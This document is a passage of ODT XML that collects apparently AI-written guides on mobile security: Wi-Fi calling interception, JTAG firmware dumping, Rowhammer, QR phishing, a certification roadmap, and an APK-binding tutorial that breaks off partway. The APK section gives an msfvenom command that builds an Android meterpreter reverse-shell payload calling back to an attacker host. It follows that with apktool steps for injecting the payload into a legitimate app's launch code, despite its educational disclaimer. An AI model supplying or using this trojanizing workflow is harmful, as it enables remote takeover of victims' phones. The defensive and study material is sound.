      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Wi-Fi calling extends mobile network services over internet connections, but introduces new attack vectors. Poorly implemented security in Wi-Fi calling can allow attackers on the same network to intercept calls, spoof caller ID, or hijack sessions. The feature often bypasses VPN encryption and may leak location information.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Enable Wi-Fi calling on test device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Set up packet capture on local network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Analyze traffic patterns and encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Attempt man-in-the-middle attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Capture Wi-Fi calling traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo tcpdump -i wlan0 -w wifi_calling.pcap</text:p>
      <text:p text:style-name="Preformatted_20_Text">tshark -r wifi_calling.pcap -Y "ip.addr == [carrier_ip]"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Wi-Fi calling when not needed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use VPN alongside Wi-Fi calling</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep device firmware updated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unusual call behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted calling apps for sensitive conversations</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Hardware &amp; Physical Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">23. JTAG/SWD Debug Interface Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Hardware debug interfaces</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Many devices leave JTAG or Serial Wire Debug (SWD) interfaces accessible on circuit boards. These interfaces provide full debug access to processors, allowing reading of memory, firmware extraction, and code execution. Physical access to the device is required, making this relevant for forensic analysis and hardware hacking. Some devices disable these interfaces in production, but many do not.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Identify JTAG/SWD pins on device circuit board</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use debuggers like Segger J-Link or OpenOCD</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Connect to debug interface</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Practice memory dumping and analysis</text:p>
      <text:p text:style-name="Preformatted_20_Text"># OpenOCD configuration for JTAG</text:p>
      <text:p text:style-name="Preformatted_20_Text">source [find interface/jlink.cfg]</text:p>
      <text:p text:style-name="Preformatted_20_Text">source [find target/omap4430.cfg]</text:p>
      <text:p text:style-name="Preformatted_20_Text">init</text:p>
      <text:p text:style-name="Preformatted_20_Text">halt</text:p>
      <text:p text:style-name="Preformatted_20_Text">dump_image firmware.bin 0x00000000 0x100000</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable debug interfaces in production (fuse blowing)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use secure boot chain verification</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement eFuse protection</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable JTAG password protection if available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use tamper-evident packaging</text:p>
      <text:p text:style-name="Preformatted_20_Text">24. Rowhammer Attacks on Mobile DRAM</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Mobile DRAM</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Rowhammer attacks exploit physical characteristics of DRAM to <text:soft-page-break/>flip bits in adjacent memory rows through repeated access. This can lead to privilege escalation, bypassing security boundaries, and code execution. Mobile devices are particularly vulnerable due to high-density DRAM. While more difficult to execute remotely, malicious apps can trigger Rowhammer effects.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Use Rowhammer testing tools on vulnerable device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Monitor for bit flips</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Attempt privilege escalation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Document vulnerable memory regions</text:p>
      <text:p text:style-name="Preformatted_20_Text">// Rowhammer test pattern</text:p>
      <text:p text:style-name="Preformatted_20_Text">volatile uint64_t *ptr = (uint64_t*)malloc(0x100000);</text:p>
      <text:p text:style-name="Preformatted_20_Text">for (int i = 0; i &lt; 1000000; i++) {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>*ptr = i;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>_mm_clflush(ptr);</text:p>
      <text:p text:style-name="Preformatted_20_Text">}</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply firmware updates with Rowhammer mitigations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use error-correcting code (ECC) memory where available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable target row refresh (TRR) features</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Limit direct memory access from untrusted apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use hardware security modules for sensitive operations</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Summary Table: Top Threats by Category</text:p>
      <text:p text:style-name="Preformatted_20_Text">Category<text:tab/>Vulnerability<text:tab/>Attack Vector<text:tab/>Defense Priority</text:p>
      <text:p text:style-name="Preformatted_20_Text">SIM<text:tab/>COMP128 Cracking<text:tab/>Radio proximity<text:tab/>High - Replace old SIMs</text:p>
      <text:p text:style-name="Preformatted_20_Text">SIM<text:tab/>SIM Swap<text:tab/>Social engineering<text:tab/>Critical - Carrier PIN</text:p>
      <text:p text:style-name="Preformatted_20_Text">Baseband<text:tab/>Qualcomm QMI<text:tab/>Malicious app<text:tab/>High - Security patches</text:p>
      <text:p text:style-name="Preformatted_20_Text">Baseband<text:tab/>Shadow SIM<text:tab/>Firmware mod<text:tab/>Medium - Secure boot</text:p>
      <text:p text:style-name="Preformatted_20_Text">OS<text:tab/>Accessibility Abuse<text:tab/>Social engineering<text:tab/>High - Permission audit</text:p>
      <text:p text:style-name="Preformatted_20_Text">OS<text:tab/>StrandHogg<text:tab/>Malicious app<text:tab/>Medium - Updates</text:p>
      <text:p text:style-name="Preformatted_20_Text">OS<text:tab/>ADB Exploitation<text:tab/>Physical/USB<text:tab/>Critical - Disable debug</text:p>
      <text:p text:style-name="Preformatted_20_Text">App<text:tab/>WebView Bridges<text:tab/>Web content<text:tab/>High - Validate interfaces</text:p>
      <text:p text:style-name="Preformatted_20_Text">App<text:tab/>Insecure Storage<text:tab/>Physical access<text:tab/>Critical - Encrypt data</text:p>
      <text:p text:style-name="Preformatted_20_Text">Network<text:tab/>SS7 Attacks<text:tab/>Carrier network<text:tab/>Critical - App 2FA</text:p>
      <text:p text:style-name="Preformatted_20_Text">Network<text:tab/>IMSI Catchers<text:tab/>Radio proximity<text:tab/>High - Disable 2G</text:p>
      <text:p text:style-name="Preformatted_20_Text">Hardware<text:tab/>JTAG Access<text:tab/>Physical<text:tab/>Medium - Secure hardware</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Conclusion: Building a Comprehensive Defense Strategy</text:p>
      <text:p text:style-name="Preformatted_20_Text">As a security professional, you should approach Android and SIM security through layered defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 1 - Device Configuration:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable unnecessary features (2G, ADB, Wi-Fi calling)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable SIM PIN (consider Android 17 automation trade-offs)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong lock screen with biometrics</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep OS and apps updated</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 2 - App Security:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Install only from trusted sources</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Review app permissions regularly</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use security solutions (ESET, Malwarebytes)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid rooting/jailbreaking</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 3 - Authentication:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Replace SMS 2FA with authenticator apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use hardware security keys for critical accounts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable carrier account protection</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious account activity</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 4 - Network Security:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use VPN on untrusted networks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable 2G/3G where possible</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Be aware of IMSI catcher risks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted messaging apps</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 5 - Physical Security:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep devices physically secure</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use remote wipe capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable full disk encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider tamper-evident features</text:p>
      <text:p text:style-name="Preformatted_20_Text">The mobile threat landscape continues to evolve rapidly. Stay informed through security bulletins from Google, carrier alerts, and security research communities. Regular security assessments of your own devices and practices will help identify vulnerabilities before attackers can exploit them.</text:p>
      <text:p text:style-name="Preformatted_20_Text">­</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Based on your interest in Android and SIM card vulnerabilities, I can outline a structured learning path to build deep, practical competence. The key is to combine foundational knowledge with specialized, hands-on training that reflects real-world threats. The following recommendations are synthesized from industry-recognized training programs and the latest research in mobile security.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Here is a progressive study roadmap designed to transform your understanding from general concepts to expert-level analysis.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Level 1: Build a Strong Foundation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Before diving into exploits, you need a solid grasp of core IT and security principles. This foundation will make advanced topics far more comprehensible.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: Core networking concepts (TCP/IP, DNS, HTTP/HTTPS), operating system fundamentals (Linux/Windows), and basic security principles (CIA triad, common vulnerabilities, access control). The CompTIA Security+ certification is an excellent, vendor-neutral starting point that covers these topics, including an introduction to mobile security concerns .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: Every mobile vulnerability you will study—from a flawed network protocol to an insecure app data storage issue—is an application of these fundamental concepts.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Next Step: Focus on understanding how things work, not just what the vulnerabilities are. Set up a home lab with virtual machines to practice.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Level 2: Specialize in Mobile Platforms</text:p>
      <text:p text:style-name="Preformatted_20_Text">With a foundation in place, you can focus specifically on the architecture and security models of Android and iOS. This is where you start to understand the "why" behind the vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: The Android security model (permissions, sandboxing, app signing, keystore), the Linux kernel's role, Inter-Process Communication (IPC), and the specifics of each Android version's security enhancements. For a structured approach, consider courses like Kennesaw State University's "Cybersecurity and Mobility" on Coursera, which covers enterprise mobility, IoT, and mobile threats .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: Vulnerabilities like "StrandHogg" (task hijacking) or "Janus" (signature bypass) [from our previous conversation] are direct consequences of specific design choices in Android's IPC and APK handling. You cannot exploit or defend against them without understanding those systems.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Level 3: Hands-On Analysis and Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is where you move from theory to practice by learning how security professionals actively test applications and devices.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: Practical mobile application penetration testing. This involves setting up testing environments, using tools like Burp Suite, Frida, and MobSF, and learning techniques for static and dynamic analysis, reverse-engineering, and intercepting network traffic. The INE Security Mobile Application Penetration Tester (eMAPT) certification is designed specifically for this, focusing on analyzing and pentesting Android apps in a practical, exam-based setting .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: This directly translates to your goal. By learning to pentest an app, you will discover vulnerabilities like insecure data storage, broken <text:soft-page-break/>cryptography, or side-channel leaks firsthand. The eMAPT curriculum, for example, covers advanced techniques like mobile application fuzzing and reverse engineering, which are essential for finding unknown flaws .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Level 4: Advanced and Emerging Threats</text:p>
      <text:p text:style-name="Preformatted_20_Text">For a truly deep understanding, you should engage with cutting-edge research and the most complex areas of mobile security, such as the baseband and SIM card.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: Advanced topics like baseband processor security, SIM card applet vulnerabilities, and cellular network protocol attacks. This involves engaging with academic research and highly specialized training.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ SIM Card Security: Review research papers like "SIMurai: Slicing Through the Complexity of SIM Card Security Research" from CISPA, which demonstrates how malicious SIM cards can attack devices and led to the discovery of high-severity vulnerabilities in flagship smartphones .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Platform-Level Security: Understand the highest levels of platform assurance, such as Android's recent achievement of the SESIP Level 5 certification for its pKVM hypervisor, which ensures it can resist attacks from well-funded and highly skilled adversaries .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Specialized Training: For a comprehensive deep dive, consider advanced courses like the SANS Institute's "SEC575: iOS and Android Application Security Analysis and Penetration Testing" (which prepares for the GIAC GMOB certification) or Mandiant Academy's "Practical Mobile Application Security" course, which covers advanced topics like Arm64 assembly and thick client app testing .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: This level of study prepares you to understand and potentially discover the kinds of sophisticated vulnerabilities we discussed earlier, such as Qualcomm baseband QMI exploits or SIM card Java applet flaws. It moves you from a "user" of security knowledge to a contributor.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Summary of Key Certifications and Courses</text:p>
      <text:p text:style-name="Preformatted_20_Text">Certification/Course<text:tab/>Focus Area<text:tab/>Provider<text:tab/>Key Benefit</text:p>
      <text:p text:style-name="Preformatted_20_Text">CompTIA Security+<text:tab/>Foundational IT Security<text:tab/>CompTIA<text:tab/>Entry-level, broad coverage including mobile basics.</text:p>
      <text:p text:style-name="Preformatted_20_Text">eMAPT<text:tab/>Mobile App Penetration Testing<text:tab/>INE Security<text:tab/>Hands-on, practical exam for Android app pentesting.</text:p>
      <text:p text:style-name="Preformatted_20_Text">GIAC GMOB (GMOB)<text:tab/>Advanced Mobile Device Security<text:tab/>GIAC (SANS)<text:tab/>Comprehensive coverage of iOS/Android hardware, software, and app security analysis.</text:p>
      <text:p text:style-name="Preformatted_20_Text">SEC575<text:tab/>iOS/Android App Security Analysis<text:tab/>SANS Institute<text:tab/>In-depth training course corresponding to GMOB certification.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Practical Mobile Application Security<text:tab/>Advanced Mobile App Testing<text:tab/>Mandiant Academy<text:tab/>Instructor-led, covers threat modeling, Linux CLI, and object-oriented programming.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">By following this progressive path, you will build a robust and practical understanding of mobile security, from the foundational principles to the most advanced and emerging threats, making you highly competent in the field.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Text_20_body">This guide explores QR code security from a cybersecurity perspective, covering how they work, how criminals exploit them, and how to protect yourself and your organization effectively.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🧠 1. How Do QR Codes Actually Work?</text:h>
      <text:p text:style-name="Text_20_body">QR encodes data in a grid of black and white squares. Robust scanning is ensured by <text:span text:style-name="T1">error correction</text:span>, which, depending on the level, can restore up to 30% of the code even if obscured by a logo or dirt.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>🎯 2. How Cybercriminals Exploit QR Codes</text:h>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">Quishing (QR Code Phishing)</text:span>: Attackers hide malicious links in QR codes to bypass text-based security. These codes often arrive in urgent emails about payroll, password resets, or on tampered public posters, to steal credentials or deploy malware.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">Split QR Codes</text:span>: Blocks split into multiple images in HTML emails combine visually for the user but register as harmless to security scanners.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">Nested QR Codes</text:span>: Embedding a malicious QR around a legitimate one creates ambiguous signals that confuse scanners, often with the inner code pointing to a legitimate site like Google.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">Conditional Routing</text:span>: Codes analyze the user's device and location to deliver tailored exploits or fake login pages for maximum effectiveness.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">Malvertising</text:span>: Fake "charging station" stickers redirect victims to payment portals instead of hijacking the charge port itself.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">QRLJacking</text:span>: Attackers replace a legitimate authentication QR code on a login page with a malicious one to gain unauthorized access to accounts.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T1">Malware Distribution</text:span>: Sophisticated attacks use codes for stealth, such as an npm package (<text:span text:style-name="T2">fezbox</text:span>) that used a QR for deep obfuscation to steal browser credentials.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">🛡️ 3. How to Protect Yourself and Your Organization</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Awareness is your strongest defense.</text:span></text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">For Individuals</text:h>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T1">Verify by URL Preview</text:span>: Use apps that show the domain name without automatically opening the browser, and check for misspellings.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T1">Source Verification</text:span>: If at a restaurant, ask staff to confirm their official QR code. If in an email, contact the sender through a known channel before scanning.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T1">Manual Navigation</text:span>: For any financial or security alert, <text:span text:style-name="T1">don't scan the code</text:span>; navigate directly to the official website or app.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T1">Inspect Physically</text:span>: Before scanning a public QR code, check for stickers or signs of tampering.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T1">Disable Auto-Open</text:span>: Turn off any setting that automatically opens links from your camera scan.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="T1">Stay Updated</text:span>: Regular phone OS and security software updates patch known vulnerabilities.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4" text:outline-level="4" text:is-list-header="true">For Organizations</text:h>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T1">User Awareness Training</text:span>: Train employees to identify quishing, not just email phishing.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T1">Multifactor Authentication (MFA)</text:span>: Require MFA for all sensitive systems to make stolen credentials less useful.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:soft-page-break/><text:span text:style-name="T1">Enhanced Email Security</text:span>: Use solutions that inspect QR code images using <text:span text:style-name="T1">multimodal AI</text:span>, and conduct <text:span text:style-name="T1">safe URL sandboxing</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T1">Conditional Access Policies</text:span>: Limit access from unmanaged devices and unusual locations.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T1">Incident Response</text:span>: Ensure employees know how to report quishing attempts and have a plan to revoke compromised sessions.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Tools like Zimperium and Sophos Intercept X for Mobile can further detect and block these threats at the enterprise level.</text:p>
      <text:p text:style-name="Text_20_body">Please let me know if you have any other questions.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">🎭 APK Binding &amp; Steganography: How Malware Hides in Clean Apps</text:h>
      <text:p text:style-name="Text_20_body">This is a critical topic in Android security. I'll explain how attackers combine legitimate apps with malware, show the technical process, and most importantly, teach you how to protect yourself.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">⚠️ CRITICAL LEGAL DISCLAIMER</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">This information is for EDUCATIONAL AND DEFENSIVE PURPOSES ONLY.</text:span> The techniques described here are illegal when used without authorization. Only test on devices YOU OWN. Unauthorized access violates computer fraud laws worldwide and can result in severe penalties including imprisonment.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧠 Part 1: The Core Concept – What is APK Binding?</text:h>
      <text:p text:style-name="Text_20_body">APK binding (also called "repackaging" or "trojanizing") is the process of injecting malicious code into a legitimate Android application package (APK).</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">How Attackers Think About This:</text:h>
      <table:table table:name="Table1" table:style-name="Table1">
        <table:table-column table:style-name="Table1.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Step</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Attacker's Goal</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P5">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B2" office:value-type="string">
            <text:p text:style-name="P5">Find a popular app users trust (WhatsApp, flashlight, game)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P5">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B2" office:value-type="string">
            <text:p text:style-name="P5">Download the legitimate APK</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P5">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B2" office:value-type="string">
            <text:p text:style-name="P5">Reverse engineer it to insert malicious code</text:p>
          </table:table-cell>
        </table:table-row>
        <text:soft-page-break/>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P5">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B2" office:value-type="string">
            <text:p text:style-name="P5">Repackage and sign with a fake certificate</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P5">5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B2" office:value-type="string">
            <text:p text:style-name="P5">Distribute through third-party stores, phishing links, or fake updates</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">The key deception: <text:span text:style-name="T1">The app looks and works normally, so users never suspect it's compromised.</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔬 Part 2: The Technical Process – How It Works</text:h>
      <text:p text:style-name="Text_20_body">Based on the research, here's the step-by-step methodology:</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Step 1: Payload Generation</text:h>
      <text:p text:style-name="Text_20_body">Attackers first create the malicious component using tools like <text:span text:style-name="T2">msfvenom</text:span> (part of Metasploit):</text:p>
      <text:p text:style-name="P1">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">What this does:</text:span> Creates a "backdoor" APK that, when executed, connects back to the attacker's computer, giving them remote control.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Step 2: Decompilation</text:h>
      <text:p text:style-name="Text_20_body">Using a tool called <text:span text:style-name="T2">apktool</text:span>, attackers decompile BOTH the legitimate app and the payload into readable code (smali format):</text:p>
      <text:p text:style-name="P1">apktool d legitimate_app.apk -o legit_source/<text:line-break/>apktool d payload.apk -o malicious_source/</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Step 3: Code Injection</text:h>
      <text:p text:style-name="Text_20_body">This is the critical step. Attackers modify the legitimate app's entry point (the <text:span text:style-name="T2">MainActivity</text:span> or <text:span text:style-name="T2">onCreate</text:span> method) to trigger the malware when the app launches.</text:p>
      <text:p text:style-name="P1"># Find the main activity in AndroidManifest.xml<text:line-break/>grep -i "android:name" AndroidManifest.xml<text:line-break/><text:line-break/># The attacker adds malicious code to runnerActivity.smali's onCreate method</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">What gets injected:</text:span></text:p>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P6">Code that downloads the full malware payload from a remote server (Dynamic Class Loading)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Code that immediately starts the malware service</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Permission requests the malware needs</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true"><text:soft-page-break/>Step 4: Permission Merging</text:h>
      <text:p text:style-name="Text_20_body">Attackers copy all permission requests from the malware into the legitimate app's manifest:</text:p>
      <text:p text:style-name="P1">cat AndroidManifest.xml | grep -i "uses-permission" &gt;&gt; permissions.txt</text:p>
      <text:p text:style-name="Text_20_body">If the original app didn't have SMS or location permissions but the malware needs them, those requests get added. <text:span text:style-name="T1">Aware users might notice the permission change.</text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Step 5: Advanced Evasion – Steganography (The Image Method)</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">This is the answer to your specific question about images.</text:span></text:p>
      <text:p text:style-name="Text_20_body">Modern research has developed a technique called <text:span text:style-name="T1">StegoPack</text:span> that hides malicious code INSIDE image files within the app.</text:p>
